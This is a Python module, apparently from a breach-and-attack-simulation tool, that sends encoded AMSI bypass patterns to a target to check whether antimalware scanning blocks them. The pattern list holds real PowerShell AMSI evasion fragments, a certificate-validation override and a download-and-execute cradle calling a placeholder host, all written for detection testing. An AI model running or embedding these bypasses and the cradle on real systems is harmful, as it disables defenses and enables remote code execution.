"""
AMSI Bypass Testing module.
Tests Antimalware Scan Interface bypass patterns for authorized testing.
MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools

Validates that AMSI implementations properly detect obfuscated patterns.
For authorized penetration testing only.
"""
from __future__ import annotations
import base64
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

# AMSI test patterns - these test whether security scanning is functioning
# All patterns are benign test strings, not actual exploits
AMSI_TEST_PATTERNS = [
    # PowerShell obfuscation patterns (testing detection, not exploitation)
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
    "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')",
    "iex(New-Object Net.WebClient).DownloadString('http://BAS-TEST')",
    "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}",
    # String concatenation evasion test
    "'Inv'+'oke'+'-Ex'+'press'+'ion'",
    "'Am'+'si'+'Ut'+'ils'",
    # Encoding evasion test
    "[Convert]::FromBase64String('QW1zaVV0aWxz')",
    # Variable substitution test
    "${e}='Invoke-Expression';.($e) 'BAS-TEST'",
    # Tick mark evasion
    "I`nv`oke-`Ex`pression",
    # .NET reflection bypass test
    "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType(",
]


class AMSIBypassModule(BaseAttackModule):
    """Tests AMSI bypass patterns for authorized security validation."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="amsi_bypass",
            description="AMSI bypass testing - validates antimalware scanning effectiveness",
            category="evasion",
            mitre_technique_ids=["T1562.001"],
            mitre_technique_names=["Impair Defenses: Disable or Modify Tools"],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            cwe_ids=["CWE-693"],
            tags=["evasion", "amsi", "bypass", "antimalware", "powershell"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        extra = options.get("extra_patterns", [])
        patterns = list(AMSI_TEST_PATTERNS) + extra
        payloads = []
        for p in patterns:
            # Test raw
            payloads.append(f"raw:{p}")
            # Test base64 encoded
            encoded = base64.b64encode(p.encode('utf-16-le')).decode()
            payloads.append(f"b64:{encoded}")
            # Test hex encoded
            hex_encoded = p.encode().hex()
            payloads.append(f"hex:{hex_encoded}")
        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        test_path = options.get("path", "/")
        for payload in payloads:
            encoding, value = payload.split(":", 1)
            # Send via custom header for detection testing
            requests.append(AttackRequest(
                request_id=f"amsi-{uuid.uuid4().hex[:8]}",
                target=target, method="POST",
                path=test_path,
                body=value,
                content_type="text/plain",
                headers={
                    "X-BAS-Encoding": encoding,
                    "X-BAS-Module": "amsi_bypass",
                },
            ))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        encoding = request.headers.get("X-BAS-Encoding", "unknown")
        body = response.body_text.lower()

        blocked = (
            response.status_code in (403, 406, 500)
            or "malware" in body or "blocked" in body
            or "amsi" in body or "threat" in body
            or "quarantine" in body
        )

        if not blocked and response.status_code in (200, 301, 302):
            return ModuleResult(
                module_name="amsi_bypass", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                evidence=f"AMSI test pattern not detected (encoding: {encoding})",
                severity="high", mitre_technique_id="T1562.001",
                detail={"encoding": encoding, "amsi_bypassed": True},
            )
        return ModuleResult(
            module_name="amsi_bypass", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"encoding": encoding, "amsi_bypassed": False},
        )
